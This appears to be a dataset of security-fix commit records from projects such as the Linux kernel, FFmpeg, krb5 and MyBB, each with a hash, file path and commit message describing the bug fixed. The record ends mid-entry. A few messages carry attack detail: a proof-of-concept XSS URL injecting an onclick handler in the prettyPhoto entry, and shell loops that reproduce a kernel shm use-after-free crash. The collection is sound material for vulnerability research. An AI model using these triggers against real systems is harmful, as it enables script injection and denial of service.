aacraid: prevent invalid pointer dereference\n\nIt appears that driver runs into a problem here if fibsize is too small because we allocate user_srbcmd with fibsize size only but later we access it until user_srbcmd->sg.count to copy it over to srbcmd.\n\nIt is not correct to test (fibsize < sizeof(*user_srbcmd)) because this structure already includes one sg element and this is not needed for commands without data.  So, we would recommend to add the following (instead of test for fibsize == 0).\n\nSigned-off-by: Mahesh Rajashekhara <Mahesh.Rajashekhara@pmcs.com> Reported-by: Nico Golde <nico@ngolde.de> Reported-by: Fabian Yamaguchi <fabs@goesec.de> Signed-off-by: Linus Torvalds <torvalds@linux-foundation.org>

======================================================================
Commit With Fix: 
    6fb392b1a63ae36c31f62bc3fc8630b49d602b62
File(s) In Commit: 
    drivers/s390/net/qeth_core_main.c
Blob(s) In Commit: 
    bd8c09e7a8d9f519928be75819255cfe05bab2b7
Blob(s) Before Fix: 
    bd8c09e7a8d9f519928be75819255cfe05bab2b7
Projects:
    0-T-0_ps4-linux
    0day-ci_xen
Commit Message for 6fb392b1a63ae36c31f62bc3fc8630b49d602b62:
qeth: avoid buffer overflow in snmp ioctl\n\nCheck user-defined length in snmp ioctl request and allow request only if it fits into a qeth command buffer.\n\nSigned-off-by: Ursula Braun <ursula.braun@de.ibm.com> Signed-off-by: Frank Blaschka <frank.blaschka@de.ibm.com> Reviewed-by: Heiko Carstens <heicars2@linux.vnet.ibm.com> Reported-by: Nico Golde <nico@ngolde.de> Reported-by: Fabian Yamaguchi <fabs@goesec.de> Cc: <stable@vger.kernel.org> Signed-off-by: David S. Miller <davem@davemloft.net>

======================================================================
Commit With Fix: 
    f856567b930dfcdbc3323261bf77240ccdde01f5
File(s) In Commit: 
    drivers/scsi/aacraid/linit.c
Blob(s) In Commit: 
    f0d432c139d0cecedf51295562c858d22a9f44f0
Blob(s) Before Fix: 
    f0d432c139d0cecedf51295562c858d22a9f44f0
Projects:
    0-T-0_ps4-linux
    0day-ci_xen
Commit Message for f856567b930dfcdbc3323261bf77240ccdde01f5:
aacraid: missing capable() check in compat ioctl\n\nIn commit d496f94d22d1 ('[SCSI] aacraid: fix security weakness') we added a check on CAP_SYS_RAWIO to the ioctl.  The compat ioctls need the check as well.\n\nSigned-off-by: Dan Carpenter <dan.carpenter@oracle.com> Cc: stable@kernel.org Signed-off-by: Linus Torvalds <torvalds@linux-foundation.org>

======================================================================
Commit With Fix: 
    ae7b4e1f213aa659aedf9c6ecad0bf5f0476e1e2
File(s) In Commit: 
    net/ipv6/ip6_fib.c
Blob(s) In Commit: 
    5bec666aba61d464fab4e77684eedd4265143cf9
Blob(s) Before Fix: 
    5bec666aba61d464fab4e77684eedd4265143cf9
Projects:
    0-T-0_ps4-linux
    0day-ci_xen
Commit Message for ae7b4e1f213aa659aedf9c6ecad0bf5f0476e1e2:
net: fib: fib6_add: fix potential NULL pointer dereference\n\nWhen the kernel is compiled with CONFIG_IPV6_SUBTREES, and we return with an error in fn = fib6_add_1(), then error codes are encoded into the return pointer e.g. ERR_PTR(-ENOENT). In such an error case, we write the error code into err and jump to out, hence enter the if(err) condition. Now, if CONFIG_IPV6_SUBTREES is enabled, we check for:\n\n  if (pn != fn && pn->leaf == rt)     ...   if (pn != fn && !pn->leaf && !(pn->fn_flags & RTN_RTINFO))     ...\n\nSince pn is NULL and fn is f.e. ERR_PTR(-ENOENT), then pn != fn evaluates to true and causes a NULL-pointer dereference on further checks on pn. Fix it, by setting both NULL in error case, so that pn != fn already evaluates to false and no further dereference takes place.\n\nThis was first correctly implemented in 4a287eba2 ("IPv6 routing, NLM_F_* flag support: REPLACE and EXCL flags support, warn about missing CREATE flag"), but the bug got later on introduced by 188c517a0 ("ipv6: return errno pointers consistently for fib6_add_1()").\n\nSigned-off-by: Daniel Borkmann <dborkman@redhat.com> Cc: Lin Ming <mlin@ss.pku.edu.cn> Cc: Matti Vaittinen <matti.vaittinen@nsn.com> Cc: Hannes Frederic Sowa <hannes@stressinduktion.org> Acked-by: Hannes Frederic Sowa <hannes@stressinduktion.org> Acked-by: Matti Vaittinen <matti.vaittinen@nsn.com> Signed-off-by: David S. Miller <davem@davemloft.net>

======================================================================
Commit With Fix: 
    cf970c002d270c36202bd5b9c2804d3097a52da0
File(s) In Commit: 
    net/ipv4/ping.c
Blob(s) In Commit: 
    91bfe0437e7a0123416103b95b274f7cd89aed02
Blob(s) Before Fix: 
    91bfe0437e7a0123416103b95b274f7cd89aed02
Projects:
    0-T-0_ps4-linux
    0day-ci_xen
Commit Message for cf970c002d270c36202bd5b9c2804d3097a52da0:
ping: prevent NULL pointer dereference on write to msg_name\n\nA plain read() on a socket does set msg->msg_name to NULL. So check for NULL pointer first.\n\nSigned-off-by: Hannes Frederic Sowa <hannes@stressinduktion.org> Signed-off-by: David S. Miller <davem@davemloft.net>

======================================================================
Commit With Fix: 
    f4d5cc8e1f39d132b61e110674528cac727ae0e2
File(s) In Commit: 
    templates/lxc-sshd.in
Blob(s) In Commit: 
    bbbea62f97063b917c87b39c67e5665b5f5d8c63
Blob(s) Before Fix: 
    bbbea62f97063b917c87b39c67e5665b5f5d8c63
Projects:
    0x0916_lxc
Commit Message for f4d5cc8e1f39d132b61e110674528cac727ae0e2:
sshd: Don't bind-mount /sbin/init read-write\n\nlxc-sshd was mounting itself (the template script) as /sbin/init in the container using a writable bind-mount.\n\nThis shouldn't be needed and could lead to quite a few problems should one of those containers overwrite /sbin/init for some reason.\n\nInstead simply move to a read-only bind-mount which should prevent any accidental dammage.\n\nSigned-off-by: Stéphane Graber <stgraber@ubuntu.com>

======================================================================
Commit With Fix: 
    4818204506e8e94645b52adb9426bedfa9ffdd04
File(s) In Commit: 
    jbpm-console-ng-human-tasks/jbpm-console-ng-human-tasks-client/src/main/java/org/jbpm/console/ng/ht/client/editors/taskdetailsmulti/TaskDetailsMultiPresenter.java
Blob(s) In Commit: 
    d52b0c287db1bd520c173a134b855e231361347a
Blob(s) Before Fix: 
    d52b0c287db1bd520c173a134b855e231361347a
Projects:
    Cory-jbpm_jbpm-wb
Commit Message for 4818204506e8e94645b52adb9426bedfa9ffdd04:
BZ-1049109: escaping task name html inputs

======================================================================
Commit With Fix: 
    3e88c98ca513880e2b43ed7f27ade17fef5d9170
File(s) In Commit: 
    security/MemberLoginForm.php
Blob(s) In Commit: 
    cb584539cc2465d0bfe583261851c5d314efd6c7
Blob(s) Before Fix: 
    cb584539cc2465d0bfe583261851c5d314efd6c7
Projects:
    12345678--_silverstripe-framework
Commit Message for 3e88c98ca513880e2b43ed7f27ade17fef5d9170:
API Restrict MemberLoginForm to POST requests for increased security\n\nCVE-2013-2653 - Thanks to Fara Rustein of Deloitte Argentina for reporting.

======================================================================
Commit With Fix: 
    c2ccf4197f697c4ff143b8a786acdd875e70a89d
File(s) In Commit: 
    src/kdc/main.c
Blob(s) In Commit: 
    71606079659c1ae940d74770850e4ccfbc9d2f92
Blob(s) Before Fix: 
    71606079659c1ae940d74770850e4ccfbc9d2f92
Projects:
    3van_krb5
Commit Message for c2ccf4197f697c4ff143b8a786acdd875e70a89d:
Multi-realm KDC null deref [CVE-2013-1418]\n\nIf a KDC serves multiple realms, certain requests can cause setup_server_realm() to dereference a null pointer, crashing the KDC.\n\nCVSSv2: AV:N/AC:M/Au:N/C:N/I:N/A:P/E:POC/RL:OF/RC:C\n\nA related but more minor vulnerability requires authentication to exploit, and is only present if a third-party KDC database module can dereference a null pointer under certain conditions.\n\n(back ported from commit 5d2d9a1abe46a2c1a8614d4672d08d9d30a5f8bf)\n\nticket: 7757 (new) version_fixed: 1.10.7 status: resolved

======================================================================
Commit With Fix: 
    3ef0ddfefebbcc6bbe9245f9cea87e26838e9bbc
File(s) In Commit: 
    js/jquery.prettyPhoto.js
Blob(s) In Commit: 
    671db901eb7c0fc54f325fad4ca738070555f577
Blob(s) Before Fix: 
    671db901eb7c0fc54f325fad4ca738070555f577
Projects:
    19silly_prettyphoto
Commit Message for 3ef0ddfefebbcc6bbe9245f9cea87e26838e9bbc:
Update js/jquery.prettyPhoto.js\n\nEscape hashRel and parse hashIndex as integer.  Example: http://www.no-margin-for-errors.com/projects/prettyPhoto-jquery-lightbox-clone/#prettyPhoto[pp_gal]/2,<a onclick="alert(1) ">/

======================================================================
Commit With Fix: 
    29ffeef5e73b8f41ff3a3f2242d356759c66f91f
File(s) In Commit: 
    libavcodec/h264.c
Blob(s) In Commit: 
    66720571ab13b0589d22443546283dbbe7af0090
Blob(s) Before Fix: 
    66720571ab13b0589d22443546283dbbe7af0090
Projects:
    00ERNEST00_FFmpeg
Commit Message for 29ffeef5e73b8f41ff3a3f2242d356759c66f91f:
avcodec/h264: do not trust last_pic_droppable when marking pictures as done\n\nThis simplifies the code and fixes a deadlock\n\nFixes Ticket2927 Signed-off-by: Michael Niedermayer <michaelni@gmx.at>

======================================================================
Commit With Fix: 
    3819db745da2ac7fb3faacb116788c32f4753f34
File(s) In Commit: 
    libavcodec/rpza.c
Blob(s) In Commit: 
    416f8b67228903c9d0aab77799f115f34721de28
Blob(s) Before Fix: 
    416f8b67228903c9d0aab77799f115f34721de28
Projects:
    00ERNEST00_FFmpeg
Commit Message for 3819db745da2ac7fb3faacb116788c32f4753f34:
avcodec/rpza: Perform pointer advance and checks before using the pointers\n\nFixes out of array accesses Fixes Ticket2850\n\nSigned-off-by: Michael Niedermayer <michaelni@gmx.at>

======================================================================
Commit With Fix: 
    454a11a1c9c686c78aa97954306fb63453299760
File(s) In Commit: 
    libavcodec/dsputil.c
Blob(s) In Commit: 
    53fd5720cdbffd319357e31140e3157185267629
Blob(s) Before Fix: 
    53fd5720cdbffd319357e31140e3157185267629
Projects:
    00ERNEST00_FFmpeg
Commit Message for 454a11a1c9c686c78aa97954306fb63453299760:
avcodec/dsputil: fix signedness in sizeof() comparissions\n\nSigned-off-by: Michael Niedermayer <michaelni@gmx.at>

======================================================================
Commit With Fix: 
    547d690d676064069d44703a1917e0dab7e33445
File(s) In Commit: 
    libavcodec/ffv1dec.c
Blob(s) In Commit: 
    3081207a04929ba8f71d39576f5b9a8f24bae339
Blob(s) Before Fix: 
    3081207a04929ba8f71d39576f5b9a8f24bae339
Projects:
    00ERNEST00_FFmpeg
Commit Message for 547d690d676064069d44703a1917e0dab7e33445:
ffv1dec: check that global parameters dont change in version 0/1\n\nSuch changes are not allowed nor supported\n\nFixes Ticket2906\n\nFound-by: ami_stuff Signed-off-by: Michael Niedermayer <michaelni@gmx.at>

======================================================================
Commit With Fix: 
    780669ef7c23c00836a24921fcc6b03be2b8ca4a
File(s) In Commit: 
    libavcodec/jpeg2000dec.c
Blob(s) In Commit: 
    b150bc1595045b4946b8f127905029ce34b721b3
Blob(s) Before Fix: 
    b150bc1595045b4946b8f127905029ce34b721b3
Projects:
    00ERNEST00_FFmpeg
Commit Message for 780669ef7c23c00836a24921fcc6b03be2b8ca4a:
avcodec/jpeg2000dec: non zero image offsets are not supported\n\nFixes out of array accesses Fixes Ticket3080 Found-by: ami_stuff Signed-off-by: Michael Niedermayer <michaelni@gmx.at>

======================================================================
Commit With Fix: 
    821a5938d100458f4d09d634041b05c860554ce0
File(s) In Commit: 
    libavcodec/g2meet.c
Blob(s) In Commit: 
    ccccf218346dfeec6e5773d2ba57303cc7638cba
Blob(s) Before Fix: 
    ccccf218346dfeec6e5773d2ba57303cc7638cba
Projects:
    00ERNEST00_FFmpeg
Commit Message for 821a5938d100458f4d09d634041b05c860554ce0:
avcodec/g2meet: Fix order of align and pixel size multiplication.\n\nFixes out of array accesses Fixes Ticket2922\n\nFound-by: ami_stuff Signed-off-by: Michael Niedermayer <michaelni@gmx.at>

======================================================================
Commit With Fix: 
    86736f59d6a527d8bc807d09b93f971c0fe0bb07
File(s) In Commit: 
    libavcodec/pngdsp.c
Blob(s) In Commit: 
    5ab1c351b25374d4aacf9447691f134038290341
Blob(s) Before Fix: 
    5ab1c351b25374d4aacf9447691f134038290341
Projects:
    00ERNEST00_FFmpeg
Commit Message for 86736f59d6a527d8bc807d09b93f971c0fe0bb07:
avcodec/pngdsp: fix (un)signed type in end comparission\n\nFixes out of array accesses Fixes Ticket2919\n\nFound_by: ami_stuff Signed-off-by: Michael Niedermayer <michaelni@gmx.at>

======================================================================
Commit With Fix: 
    880c73cd76109697447fbfbaa8e5ee5683309446
File(s) In Commit: 
    libavcodec/flashsv.c
Blob(s) In Commit: 
    f00bf21d4721f1a15d73c3fdb5f44414f4a52d3f
Blob(s) Before Fix: 
    f00bf21d4721f1a15d73c3fdb5f44414f4a52d3f
Projects:
    00ERNEST00_FFmpeg
Commit Message for 880c73cd76109697447fbfbaa8e5ee5683309446:
avcodec/flashsv: check diff_start/height\n\nFixes out of array accesses Fixes Ticket2844\n\nFound-by: ami_stuff Signed-off-by: Michael Niedermayer <michaelni@gmx.at>

======================================================================
Commit With Fix: 
    8bb11c3ca77b52e05a9ed1496a65f8a76e6e2d8f
File(s) In Commit: 
    libavcodec/jpeg2000dec.c
Blob(s) In Commit: 
    34ac5360560322c3f42625ab1f426c487a13dfc3
Blob(s) Before Fix: 
    34ac5360560322c3f42625ab1f426c487a13dfc3
Projects:
    00ERNEST00_FFmpeg
Commit Message for 8bb11c3ca77b52e05a9ed1496a65f8a76e6e2d8f:
avcodec/jpeg2000dec: Check cdx/y values more carefully\n\nSome invalid values where not handled correctly in the later pixel format matching code. Fixes out of array accesses Fixes Ticket2848\n\nFound-by: Piotr Bandurski <ami_stuff@o2.pl> Signed-off-by: Michael Niedermayer <michaelni@gmx.at>

======================================================================
Commit With Fix: 
    912ce9dd2080c5837285a471d750fa311e09b555
File(s) In Commit: 
    libavcodec/jpeg2000.c
Blob(s) In Commit: 
    dc3311052ee2f237020e2c97f7eead9b15a4d9e8
Blob(s) Before Fix: 
    dc3311052ee2f237020e2c97f7eead9b15a4d9e8
Projects:
    00ERNEST00_FFmpeg
Commit Message for 912ce9dd2080c5837285a471d750fa311e09b555:
jpeg2000: fix dereferencing invalid pointers\n\nFound-by: Laurent Butti <laurentb@gmail.com> Signed-off-by: Michael Niedermayer <michaelni@gmx.at>

======================================================================
Commit With Fix: 
    9a271a9368eaabf99e6c2046103acb33957e63b7
File(s) In Commit: 
    libavcodec/jpeg2000dec.c
Blob(s) In Commit: 
    8c0e6ffd66e953c9792dc93aba1a363a61297e7f
Blob(s) Before Fix: 
    8c0e6ffd66e953c9792dc93aba1a363a61297e7f
Projects:
    00ERNEST00_FFmpeg
Commit Message for 9a271a9368eaabf99e6c2046103acb33957e63b7:
jpeg2000: check log2_cblk dimensions\n\nFixes out of array access Fixes Ticket2895\n\nFound-by: Piotr Bandurski <ami_stuff@o2.pl> Signed-off-by: Michael Niedermayer <michaelni@gmx.at>

======================================================================
Commit With Fix: 
    a1b9004b768bef606ee98d417bceb9392ceb788d
File(s) In Commit: 
    libavcodec/jpeg2000dec.c
Blob(s) In Commit: 
    80bc335507fbeaa7b0a0cc7280b9de8bfadbc580
Blob(s) Before Fix: 
    80bc335507fbeaa7b0a0cc7280b9de8bfadbc580
Projects:
    00ERNEST00_FFmpeg
Commit Message for a1b9004b768bef606ee98d417bceb9392ceb788d:
avcodec/jpeg2000dec: fix context consistency with too large lowres\n\nFixes out of array accesses Fixes Ticket2898\n\nSigned-off-by: Michael Niedermayer <michaelni@gmx.at>

======================================================================
Commit With Fix: 
    b05cd1ea7e45a836f7f6071a716c38bb30326e0f
File(s) In Commit: 
    libavcodec/ffv1dec.c
Blob(s) In Commit: 
    38e0849d87dc822baefb95e18a8b881836c32529
Blob(s) Before Fix: 
    38e0849d87dc822baefb95e18a8b881836c32529
Projects:
    00ERNEST00_FFmpeg
Commit Message for b05cd1ea7e45a836f7f6071a716c38bb30326e0f:
ffv1dec: Check bits_per_raw_sample and colorspace for equality in ver 0/1 headers\n\nSigned-off-by: Michael Niedermayer <michaelni@gmx.at>

======================================================================
Commit With Fix: 
    cdd5df8189ff1537f7abe8defe971f80602cc2d2
File(s) In Commit: 
    libavfilter/vf_fps.c
Blob(s) In Commit: 
    06ebdfadce66425c7b2b430fcb020bf382dba29e
Blob(s) Before Fix: 
    06ebdfadce66425c7b2b430fcb020bf382dba29e
Projects:
    00ERNEST00_FFmpeg
Commit Message for cdd5df8189ff1537f7abe8defe971f80602cc2d2:
avfilter/vf_fps: make sure the fifo is not empty before using it\n\nFixes Ticket2905\n\nSigned-off-by: Michael Niedermayer <michaelni@gmx.at>

======================================================================
Commit With Fix: 
    e07ac727c1cc9eed39e7f9117c97006f719864bd
File(s) In Commit: 
    libavcodec/g2meet.c
Blob(s) In Commit: 
    1eae1a49b5dae63e35bbd232b689b2ed25f54f81
Blob(s) Before Fix: 
    1eae1a49b5dae63e35bbd232b689b2ed25f54f81
Projects:
    00ERNEST00_FFmpeg
Commit Message for e07ac727c1cc9eed39e7f9117c97006f719864bd:
avcodec/g2meet: Fix framebuf size\n\nCurrently the code can in some cases draw tiles that hang outside the allocated buffer. This patch increases the buffer size to avoid out of array accesses. An alternative would be to fail if such tiles are encountered. I do not know if any valid files use such hanging tiles.\n\nFixes Ticket2971 Found-by: ami_stuff Signed-off-by: Michael Niedermayer <michaelni@gmx.at>

======================================================================
Commit With Fix: 
    f31011e9abfb2ae75bb32bc44e2c34194c8dc40a
File(s) In Commit: 
    libavcodec/parser.c
Blob(s) In Commit: 
    8a825938a6518deceadbeecd0b3cb41e24e173d5
Blob(s) Before Fix: 
    8a825938a6518deceadbeecd0b3cb41e24e173d5
Projects:
    00ERNEST00_FFmpeg
Commit Message for f31011e9abfb2ae75bb32bc44e2c34194c8dc40a:
avcodec/parser: reset indexes on realloc failure\n\nFixes Ticket2982\n\nSigned-off-by: Michael Niedermayer <michaelni@gmx.at>

======================================================================
Commit With Fix: 
    fe448cd28d674c3eff3072552eae366d0b659ce9
File(s) In Commit: 
    libavcodec/jpeg2000dec.c
Blob(s) In Commit: 
    ef63d37f0c63864330b8c4963b2332769b7a31f9
Blob(s) Before Fix: 
    ef63d37f0c63864330b8c4963b2332769b7a31f9
Projects:
    00ERNEST00_FFmpeg
Commit Message for fe448cd28d674c3eff3072552eae366d0b659ce9:
avcodec/jpeg2000dec: prevent out of array accesses in pixel addressing\n\nFixes Ticket2921\n\nSigned-off-by: Michael Niedermayer <michaelni@gmx.at>

======================================================================
Commit With Fix: 
    a399b29dfbaaaf91162b2dc5a5875dd51bbfa2a1
File(s) In Commit: 
    ipc/shm.c
Blob(s) In Commit: 
    0bdf21c6814ef8118be3ae56196b85f11b7b3ac2
Blob(s) Before Fix: 
    0bdf21c6814ef8118be3ae56196b85f11b7b3ac2
Projects:
    0-T-0_ps4-linux
    0day-ci_xen
Commit Message for a399b29dfbaaaf91162b2dc5a5875dd51bbfa2a1:
ipc,shm: fix shm_file deletion races\n\nWhen IPC_RMID races with other shm operations there's potential for use-after-free of the shm object's associated file (shm_file).\n\nHere's the race before this patch:\n\n  TASK 1                     TASK 2   ------                     ------   shm_rmid()     ipc_lock_object()                              shmctl()                              shp = shm_obtain_object_check()\n\n    shm_destroy()       shum_unlock()       fput(shp->shm_file)                              ipc_lock_object()                              shmem_lock(shp->shm_file)                              <OOPS>\n\nThe oops is caused because shm_destroy() calls fput() after dropping the ipc_lock.  fput() clears the file's f_inode, f_path.dentry, and f_path.mnt, which causes various NULL pointer references in task 2.  I reliably see the oops in task 2 if with shmlock, shmu\n\nThis patch fixes the races by: 1) set shm_file=NULL in shm_destroy() while holding ipc_object_lock(). 2) modify at risk operations to check shm_file while holding    ipc_object_lock().\n\nExample workloads, which each trigger oops...\n\nWorkload 1:   while true  do     id=$(shmget 1 4096)     shm_rmid $id &     shmlock $id &     wait   done\n\n  The oops stack shows accessing NULL f_inode due to racing fput:     _raw_spin_lock     shmem_lock     SyS_shmctl\n\nWorkload 2:   while true  do     id=$(shmget 1 4096)     shmat $id 4096 &     shm_rmid $id &     wait   done\n\n  The oops stack is similar to workload 1 due to NULL f_inode:     touch_atime     shmem_mmap     shm_mmap     mmap_region     do_mmap_pgoff     do_shmat     SyS_shmat\n\nWorkload 3:   while true  do     id=$(shmget 1 4096)     shmlock $id     shm_rmid $id &     shmunlock $id &     wait   done\n\n  The oops stack shows second fput tripping on an NULL f_inode.  The   first fput() completed via from shm_destroy(), but a racing thread did   a get_file() and queued this fput():     locks_remove_flock     __fput     ____fput     task_work_run     do_notify_resume     int_signal\n\nFixes: c2c737a0461e ("ipc,shm: shorten critical region for shmat") Fixes: 2caacaa82a51 ("ipc,shm: shorten critical region for shmctl") Signed-off-by: Greg Thelen <gthelen@google.com> Cc: Davidlohr Bueso <davidlohr@hp.com> Cc: Rik van Riel <riel@redhat.com> Cc: Manfred Spraul <manfred@colorfullife.com> Cc: <stable@vger.kernel.org>  # 3.10.17+ 3.11.6+ Signed-off-by: Andrew Morton <akpm@linux-foundation.org> Signed-off-by: Linus Torvalds <torvalds@linux-foundation.org>

======================================================================
Commit With Fix: 
    f5563318ff1bde15b10e736e97ffce13be08bc1a
File(s) In Commit: 
    net/wireless/radiotap.c
Blob(s) In Commit: 
    a271c27fac774ce987c0db6f1330ffbfca6dc7f7
Blob(s) Before Fix: 
    a271c27fac774ce987c0db6f1330ffbfca6dc7f7
Projects:
    0-T-0_ps4-linux
    0day-ci_xen
Commit Message for f5563318ff1bde15b10e736e97ffce13be08bc1a:
wireless: radiotap: fix parsing buffer overrun\n\nWhen parsing an invalid radiotap header, the parser can overrun the buffer that is passed in because it doesn't correctly check  1) the minimum radiotap header size  2) the space for extended bitmaps\n\nThe first issue doesn't affect any in-kernel user as they all check the minimum size before calling the radiotap function. The second issue could potentially affect the kernel if an skb is passed in that consists only of the radiotap header with a lot of extended bitmaps that extend past the SKB. In that case a read-only buffer overrun by at most 4 bytes is possible.\n\nFix this by adding the appropriate checks to the parser.\n\nCc: stable@vger.kernel.org Reported-by: Evan Huus <eapache@gmail.com> Signed-off-by: Johannes Berg <johannes.berg@intel.com>

======================================================================
Commit With Fix: 
    a7fedbb36388bad0c0f32b2346481e0ea126dea6
File(s) In Commit: 
    app/controllers/application_controller.rb
Blob(s) In Commit: 
    7d4f3308736d6e2637378b50a46eab1d66e56372
Blob(s) Before Fix: 
    7d4f3308736d6e2637378b50a46eab1d66e56372
Projects:
    0bserver07_fat_free_crm
Commit Message for a7fedbb36388bad0c0f32b2346481e0ea126dea6:
Ensure requests are protected.

======================================================================
Commit With Fix: 
    3a10f6b829297dae63492a8c63385044bc6953ed
File(s) In Commit: 
    mappostgis.c
Blob(s) In Commit: 
    f24d9697a3447c78dc90d6fef84f3ad9bf21d43f
Blob(s) Before Fix: 
    f24d9697a3447c78dc90d6fef84f3ad9bf21d43f
Projects:
    3x0dv5_mapserver
Commit Message for 3a10f6b829297dae63492a8c63385044bc6953ed:
Fix potential SQL Injection with postgis TIME filters (#4834)

======================================================================
Commit With Fix: 
    6212bc954d72caf591e141ca36b8df964387bee8
File(s) In Commit: 
    misc.php
Blob(s) In Commit: 
    c00dd9f3cb9c6b1d58b7da4c4fd9c9e560c3633e
Blob(s) Before Fix: 
    c00dd9f3cb9c6b1d58b7da4c4fd9c9e560c3633e
Projects:
    00zh_mybb
Commit Message for 6212bc954d72caf591e141ca36b8df964387bee8:
Fixes XSS in misc.php

======================================================================
Commit With Fix: 
    238696e37d6a22b89e6bba11e4de3e6620cb5547
File(s) In Commit: 
    inc/class_parser.php
Blob(s) In Commit: 
    3e8ffcdddb18c0d6db2caa2768421747c4c878e2
Blob(s) Before Fix: 
    3e8ffcdddb18c0d6db2caa2768421747c4c878e2
Projects:
    00zh_mybb
Commit Message for 238696e37d6a22b89e6bba11e4de3e6620cb5547:
Fixes XSS in inc/class_parser.php

======================================================================
Commit With Fix: 
    2899351224fe2940aec37d7656e1e392c0fe07f0
File(s) In Commit: 
    programs/pluto/ikev2_parent.c
Blob(s) In Commit: 
    ce67cc3c030a9316ef4281028aeb4e80598d2155
Blob(s) Before Fix: 
    ce67cc3c030a9316ef4281028aeb4e80598d2155
Projects:
    123kayi_libreswan
Commit Message for 2899351224fe2940aec37d7656e1e392c0fe07f0:
SECURITY: Properly handle IKEv2 I1 notification packet without KE payload

======================================================================
Commit With Fix: 
    9bd3b14042e12d84f39ea9f55731705ba516f525
File(s) In Commit: 
    framework/common/messageheaderparser.cpp
Blob(s) In Commit: 
    7bb5d6c29616aa3ec61be137fa7ea04ec042f71b
Blob(s) Before Fix: 
    7bb5d6c29616aa3ec61be137fa7ea04ec042f71b
Projects:
    42ity_tntnet
Commit Message for 9bd3b14042e12d84f39ea9f55731705ba516f525:
fix possible information leak

======================================================================
Commit With Fix: 
    c2349758acf1874e4c2b93fe41d072336f1a31d0
File(s) In Commit: 
    net/rds/ib.c
Blob(s) In Commit: 
    ba2dffeff60876ca669993d1863dcbb6cb76a740
Blob(s) Before Fix: 
    ba2dffeff60876ca669993d1863dcbb6cb76a740
Projects:
    0-T-0_ps4-linux
    0day-ci_xen
Commit Message for c2349758acf1874e4c2b93fe41d072336f1a31d0:
rds: prevent dereference of a NULL device\n\nBinding might result in a NULL device, which is dereferenced causing this BUG:\n\n[ 1317.260548] BUG: unable to handle kernel NULL pointer dereference at 000000000000097 4 [ 1317.261847] IP: [<ffffffff84225f52>] rds_ib_laddr_check+0x82/0x110 [ 1317.263315] PGD 418bcb067 PUD 3ceb21067 PMD 0 [ 1317.263502] Oops: 0000 [#1] PREEMPT SMP DEBUG_PAGEALLOC [ 1317.264179] Dumping ftrace buffer: [ 1317.264774]    (ftrace buffer empty) [ 1317.265220] Modules linked in: [ 1317.265824] CPU: 4 PID: 836 Comm: trinity-child46 Tainted: G        W    3.13.0-rc4- next-20131218-sasha-00013-g2cebb9b-dirty #4159 [ 1317.267415] task: ffff8803ddf33000 ti: ffff8803cd31a000 task.ti: ffff8803cd31a000 [ 1317.268399] RIP: 0010:[<ffffffff84225f52>]  [<ffffffff84225f52>] rds_ib_laddr_check+ 0x82/0x110 [ 1317.269670] RSP: 0000:ffff8803cd31bdf8  EFLAGS: 00010246 [ 1317.270230] RAX: 0000000000000000 RBX: ffff88020b0dd388 RCX: 0000000000000000 [ 1317.270230] RDX: ffffffff8439822e RSI: 00000000000c000a RDI: 0000000000000286 [ 1317.270230] RBP: ffff8803cd31be38 R08: 0000000000000000 R09: 0000000000000000 [ 1317.270230] R10: 0000000000000000 R11: 0000000000000001 R12: 0000000000000000 [ 1317.270230] R13: 0000000054086700 R14: 0000000000a25de0 R15: 0000000000000031 [ 1317.270230] FS:  00007ff40251d700(0000) GS:ffff88022e200000(0000) knlGS:000000000000 0000 [ 1317.270230] CS:  0010 DS: 0000 ES: 0000 CR0: 000000008005003b [ 1317.270230] CR2: 0000000000000974 CR3: 00000003cd478000 CR4: 00000000000006e0 [ 1317.270230] DR0: 0000000000000000 DR1: 0000000000000000 DR2: 0000000000000000 [ 1317.270230] DR3: 0000000000000000 DR6: 00000000ffff0ff0 DR7: 0000000000090602 [ 1317.270230] Stack: [ 1317.270230]  0000000054086700 5408670000a25de0 5408670000000002 0000000000000000 [ 1317.270230]  ffffffff84223542 00000000ea54c767 0000000000000000 ffffffff86d26160 [ 1317.270230]  ffff8803cd31be68 ffffffff84223556 ffff8803cd31beb8 ffff8800c6765280 [ 1317.270230] Call Trace: [ 1317.270230]  [<ffffffff84223542>] ? rds_trans_get_preferred+0x42/0xa0 [ 1317.270230]  [<ffffffff84223556>] rds_trans_get_preferred+0x56/0xa0 [ 1317.270230]  [<ffffffff8421c9c3>] rds_bind+0x73/0xf0 [ 1317.270230]  [<ffffffff83e4ce62>] SYSC_bind+0x92/0xf0 [ 1317.270230]  [<ffffffff812493f8>] ? context_tracking_user_exit+0xb8/0x1d0 [ 1317.270230]  [<ffffffff8119313d>] ? trace_hardirqs_on+0xd/0x10 [ 1317.270230]  [<ffffffff8107a852>] ? syscall_trace_enter+0x32/0x290 [ 1317.270230]  [<ffffffff83e4cece>] SyS_bind+0xe/0x10 [ 1317.270230]  [<ffffffff843a6ad0>] tracesys+0xdd/0xe2 [ 1317.270230] Code: 00 8b 45 cc 48 8d 75 d0 48 c7 45 d8 00 00 00 00 66 c7 45 d0 02 00 89 45 d4 48 89 df e8 78 49 76 ff 41 89 c4 85 c0 75 0c 48 8b 03 <80> b8 74 09 00 00 01 7 4 06 41 bc 9d ff ff ff f6 05 2a b6 c2 02 [ 1317.270230] RIP  [<ffffffff84225f52>] rds_ib_laddr_check+0x82/0x110 [ 1317.270230]  RSP <ffff8803cd31bdf8> [ 1317.270230] CR2: 0000000000000974\n\nSigned-off-by: Sasha Levin <sasha.levin@oracle.com> Signed-off-by: David S. Miller <davem@davemloft.net>

======================================================================
Commit With Fix: 
    017f8c2a0865ab31e01d591adc43d34f2dd60e59
File(s) In Commit: 
    lib/as/Flowplayer.as
Blob(s) In Commit: 
    d9625ba3aaaa31ee1005cf7d9de6b9244d7d40f3
Blob(s) Before Fix: 
    d9625ba3aaaa31ee1005cf7d9de6b9244d7d40f3
Projects:
    1974kpkpkp_flowplayer
Commit Message for 017f8c2a0865ab31e01d591adc43d34f2dd60e59:
Merge pull request #382 from flowplayer/bug/381\n\ndon't accept callback to be passed in the query string (#381)

======================================================================
Commit With Fix: 
    27e8f178276c185cbddb4f14c91d4ce7b3865db1
File(s) In Commit: 
    lib/as/Flowplayer.as
Blob(s) In Commit: 
    2eeab4d923f2105fd5441acce42c7260de88e998
Blob(s) Before Fix: 
    2eeab4d923f2105fd5441acce42c7260de88e998
Projects:
    1974kpkpkp_flowplayer
Commit Message for 27e8f178276c185cbddb4f14c91d4ce7b3865db1:
Merge pull request #578 from flowplayer/bug/381\n\nDecode the URL before checking the callback param.

======================================================================
Commit With Fix: 
    ef2329cf71acb59204dd981e2c6cce6c81fe467c
File(s) In Commit: 
    magic/Magdir/commands
